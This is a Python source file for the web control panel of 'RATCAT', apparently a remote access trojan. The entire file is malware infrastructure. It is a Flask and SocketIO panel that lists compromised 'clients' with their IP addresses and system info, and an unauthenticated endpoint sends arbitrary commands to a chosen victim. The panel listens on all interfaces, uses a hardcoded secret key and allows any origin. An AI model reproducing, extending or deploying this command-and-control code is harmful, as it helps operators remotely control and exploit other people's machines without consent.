#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
RATCAT - Web Panel Module
Developed by: zaax
"""

from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
import threading
import json
import os
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'RATCAT_SECRET_2026'
socketio = SocketIO(app, cors_allowed_origins="*")

class WebPanel:
    """Web interface for RATCAT"""
    
    def __init__(self, controller, port=5000):
        self.controller = controller
        self.port = port
        self.running = False
        self.app = app
        self.socketio = socketio
        self.setup_routes()
        self.setup_socket_events()
    
    def setup_routes(self):
        """Setup Flask routes"""
        
        @app.route('/')
        def index():
            return render_template('index.html')
        
        @app.route('/api/clients')
        def get_clients():
            clients = []
            for cid, client in self.controller.clients.items():
                clients.append({
                    'id': cid,
                    'ip': client.get('ip', 'Unknown'),
                    'connected': client.get('connected', False),
                    'info': client.get('info', {}),
                    'last_heartbeat': client.get('last_heartbeat', 0)
                })
            return jsonify(clients)
        
        @app.route('/api/command', methods=['POST'])
        def send_command():
            data = request.json
            client_id = data.get('client_id')
            cmd_type = data.get('command')
            params = data.get('params', {})
            
            if not client_id or not cmd_type:
                return jsonify({'error': 'Missing parameters'}), 400
            
            success = self.controller.server.command(client_id, cmd_type, params)
            
            return jsonify({
                'success': success,
                'client': client_id,
                'command': cmd_type
            })
        
        @app.route('/api/stats')
        def get_stats():
            return jsonify({
                'total_clients': len(self.controller.clients),
                'online_clients': sum(1 for c in self.controller.clients.values() if c.get('connected')),
                'uptime': time.time() - self.controller.start_time if hasattr(self.controller, 'start_time') else 0
            })
    
    def setup_socket_events(self):
        """Setup SocketIO events"""
        
        @socketio.on('connect')
        def handle_connect():
            emit('status', {'msg': 'Connected to RATCAT Web Panel'})
        
        @socketio.on('request_clients')
        def handle_request_clients():
            self.broadcast_clients()
    
    def broadcast(self, message):
        """Broadcast message to web clients"""
        try:
            self.socketio.emit('message', message)
        except:
            pass
    
    def broadcast_clients(self):
        """Broadcast client list"""
        clients = []
        for cid, client in self.controller.clients.items():
            clients.append({
                'id': cid,
                'ip': client.get('ip', 'Unknown'),
                'connected': client.get('connected', False),
                'info': client.get('info', {})
            })
        self.socketio.emit('clients', clients)
    
    def start(self):
        """Start web panel"""
        self.running = True
        
        # Create templates directory
        os.makedirs('web', exist_ok=True)
        
        # Create index.html if not exists
        if not os.path.exists('web/index.html'):
            self.create_default_template()
        
        try:
            self.socketio.run(
                app,
                host='0.0.0.0',
                port=self.port,
                debug=False,
                use_reloader=False
            )
        except Exception as e:
            print(f"[-] Web panel error: {e}")
    
    def create_default_template(self):
        """Create default HTML template"""
        # This will be handled by the actual index.html file
        pass
